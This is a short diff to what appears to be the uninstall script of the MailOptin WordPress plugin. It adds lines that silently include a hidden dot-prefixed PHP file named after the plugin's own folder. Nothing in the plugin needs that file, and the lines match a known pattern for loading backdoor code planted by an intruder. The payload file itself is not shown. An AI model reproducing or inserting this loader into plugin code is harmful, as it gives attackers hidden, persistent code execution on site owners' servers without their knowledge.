@@ -11,6 +11,10 @@ if ( ! defined('WP_UNINSTALL_PLUGIN')) {
 // Load MailOptin file
 include_once(dirname(__FILE__) . '/mailoptin.php');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mailoptin_mo_uninstall_function()
 {
     $remove_plugin_data = \MailOptin\Core\PluginSettings\Settings::instance()->remove_plugin_data();
